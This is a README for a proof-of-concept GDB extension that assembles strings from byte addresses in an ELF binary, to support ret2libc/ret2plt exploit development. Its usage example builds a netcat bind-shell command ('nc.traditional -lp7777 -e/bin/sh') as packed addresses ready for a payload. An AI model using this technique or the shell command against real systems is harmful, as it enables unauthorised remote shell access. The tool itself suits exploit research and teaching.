# gdb-memstr

## Description

This is a proof-of-concept GDB extension for assembling arbitrary ASCII strings out of the contents of the address space of an ELF binary.

It can be handy during the development of ret2libc/ret2plt attacks when the user-supplied data is not located at a fixed or predictable location, in which case the arguments for the libc function should be constructed on-the-fly by chaining calls to functions like memcpy/strcpy/strncpy/sprintf/snprintf/etc.

## Installation

> Use the `source`, Luke:
```
(gdb) source /path/to/memstr.py 
```

## Usage

```
$ gdb ./vuln
(gdb) break main
Breakpoint 1 at 0x400587
(gdb) run
Starting program: /home/max/Code/testbed/vuln 
(gdb) memstr "/bin/nc.traditional -lp7777 -e/bin/sh" text
STR = [
    struct.pack('<Q', 0x4015d8),    # /
    struct.pack('<Q', 0x4011ce),    # b
    struct.pack('<Q', 0x400b5a),    # i
    struct.pack('<Q', 0x401fee),    # n
    struct.pack('<Q', 0x4015d8),    # /
    struct.pack('<Q', 0x401fee),    # n
    struct.pack('<Q', 0x400635),    # c
    struct.pack('<Q', 0x40067a),    # .
    struct.pack('<Q', 0x4003da),    # t
    struct.pack('<Q', 0x40094b),    # r
    struct.pack('<Q', 0x4011eb),    # a
    struct.pack('<Q', 0x4006f9),    # d
    struct.pack('<Q', 0x400b5a),    # i
    struct.pack('<Q', 0x4003da),    # t
    struct.pack('<Q', 0x400b5a),    # i
    struct.pack('<Q', 0x401077),    # o
    struct.pack('<Q', 0x401fee),    # n
    struct.pack('<Q', 0x4011eb),    # a
    struct.pack('<Q', 0x4008e7),    # l
    struct.pack('<Q', 0x400787),    #  
    struct.pack('<Q', 0x4003f7),    # -
    struct.pack('<Q', 0x4008e7),    # l
    struct.pack('<Q', 0x400597),    # p
    struct.pack('<Q', 0x4003f1),    # 7
    struct.pack('<Q', 0x4003f1),    # 7
    struct.pack('<Q', 0x4003f1),    # 7
    struct.pack('<Q', 0x4003f1),    # 7
    struct.pack('<Q', 0x400787),    #  
    struct.pack('<Q', 0x4003f7),    # -
    struct.pack('<Q', 0x400f37),    # e
    struct.pack('<Q', 0x4015d8),    # /
    struct.pack('<Q', 0x4011ce),    # b
    struct.pack('<Q', 0x400b5a),    # i
    struct.pack('<Q', 0x401fee),    # n
    struct.pack('<Q', 0x4015d8),    # /
    struct.pack('<Q', 0x400519),    # s
    struct.pack('<Q', 0x4007a2),    # h
    struct.pack('<Q', 0x4003b5)     # \0
]
```

## Thanks
Thanks to [argp](https://twitter.com/_argp) for his input on this.
